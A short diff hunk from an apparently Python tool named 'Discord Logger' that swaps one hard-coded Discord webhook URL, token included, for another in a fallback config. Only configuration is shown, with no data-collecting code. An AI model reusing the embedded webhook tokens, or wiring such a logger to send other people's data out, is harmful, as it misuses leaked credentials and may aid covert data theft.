@@ -8,7 +8,7 @@ try:
         config = _json.load(f)
 except:
     config = {
-        "webhook": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN",
+        "webhook": "https://discord.com/api/webhooks/1507890711666622535/WvMKkxhxGLPeMjY63bTnxjhbVcF-Rh83BXBMoy4Ygulo6kSXG566X2pE0BUkQuiu8Jek",
         "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
         "username": "Discord Logger",
         "color": 5814783
